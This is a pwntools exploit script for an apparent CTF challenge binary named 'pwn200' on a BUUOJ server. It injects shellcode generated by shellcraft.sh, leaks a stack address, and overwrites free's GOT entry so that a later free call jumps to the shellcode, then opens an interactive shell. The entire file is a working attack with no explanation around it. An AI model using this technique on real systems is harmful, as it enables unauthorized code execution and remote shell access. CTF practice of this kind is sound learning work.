from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'

p = remote('node4.buuoj.cn', 28487)
#p = process('./pwn200')
elf = ELF('pwn200')

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

free_got = elf.got['free']

shellcode = asm(shellcraft.sh(), os = 'linux')

#debug('b *0x400a5f')

sa(b'u?\n', shellcode)

rbp = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
shellcode_addr = rbp - ( 0x930 - 0x8c0 ) + 0x20

success('shellcode_addr -> {}'.format(hex(shellcode_addr)))
sla(b'~~?\n', b'1')

sa(b'money~\n', p64(shellcode_addr) + b'\x00' * 0x30 + p64(free_got))

sla(b'choice : ', b'2')

p.interactive()